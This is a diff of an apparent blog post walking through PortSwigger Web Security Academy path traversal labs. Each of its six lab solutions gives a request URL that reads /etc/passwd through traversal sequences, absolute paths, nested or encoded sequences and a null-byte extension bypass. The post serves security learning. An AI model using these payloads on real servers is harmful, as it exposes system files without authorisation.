@@ -33,37 +33,37 @@
   </a>
 </div>
 
-    <div style="margin-top: 10px; margin-right: 200px;margin-left: 200px;background-color: #1b1b1b; padding: 50px; padding-bottom: 100px; padding-top: 10px; border-radius: 25px">
+    <div style="margin-top: 10px; margin-right: 10%;margin-left: 10%;background-color: #1b1b1b; padding: 50px; padding-bottom: 100px; padding-top: 10px; border-radius: 25px">
         <div>
           <h1 style="color: white;">Path Traversal - Web Sec academy labs</h1>
           <p>Posted on 01 Feb 2025</p>
           <hr style="border: none; border-top: 6px dotted #b5e754;"> 
           <p>This post will run through the labs on web sec academy by Portswigger related to Path traversal.</p>
 
-<h3 id="lab-file-path-traversal-simple-case">Lab: File path traversal, simple case</h3>
+<h3 id="lab-file-path-traversal-simple-case"><u>Lab: File path traversal, simple case</u></h3>
 <p>We are asked to retrieve the contents of the “/etc/passwd” file. We can see the image is loaded through it’s filename so by changing this parameter and navigating through the file system using “../” we can get the contents by send a request on burp to:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a05003804955ada8062ef4d009200a1.web-security-academy.net/image?filename=/../../../etc/passwd
 </code></pre></div></div>
 
-<h3 id="lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab: File path traversal, traversal sequences blocked with absolute path bypass</h3>
+<h3 id="lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><u>Lab: File path traversal, traversal sequences blocked with absolute path bypass</u></h3>
 <p>This time the path traversal is blocked however by supplying the absolute path of the file we can still reach it using the following url:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a98002b0476693a8032ad880041000a.web-security-academy.net/image?filename=/etc/passwd
 </code></pre></div></div>
 
-<h3 id="lab-file-path-traversal-traversal-sequences-stripped-non-recursively">Lab: File path traversal, traversal sequences stripped non-recursively</h3>
+<h3 id="lab-file-path-traversal-traversal-sequences-stripped-non-recursively"><u>Lab: File path traversal, traversal sequences stripped non-recursively</u></h3>
 <p>In this lab the application strips path traversal sequences from the user-supplied filename before using it. However we can bypass using nested traversal sequences “….//”.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a0a00d2031e790381f82a24009b0099.web-security-academy.net/image?filename=....//....//....//etc/passwd
 </code></pre></div></div>
 
-<h3 id="lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode">Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h3>
+<h3 id="lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode"><u>Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</u></h3>
 <p>We can also bypass the path traversal stripping using url encoding or even double url encoding. Thus we can bypass by double encoding this parameter:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/image?filename=../../../etc/passwd
 </code></pre></div></div>
-<h3 id="lab-file-path-traversal-validation-of-start-of-path">Lab: File path traversal, validation of start of path</h3>
+<h3 id="lab-file-path-traversal-validation-of-start-of-path"><u>Lab: File path traversal, validation of start of path</u></h3>
 <p>Sometimes the validation will want to make sure the file is in a certain folder so we will need to start from that folder then traverse to the file we want like the following:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a62006c04c196ef814f7582004c006a.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
 </code></pre></div></div>
-<h3 id="lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab: File path traversal, validation of file extension with null byte bypass</h3>
+<h3 id="lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass"><u>Lab: File path traversal, validation of file extension with null byte bypass</u></h3>
 <p>It could also require the parameter to be a certain file type which is where we can use a the null byte (%00) then put the file extension they want.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a04003b035be698805d456400b10079.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg
 </code></pre></div></div>
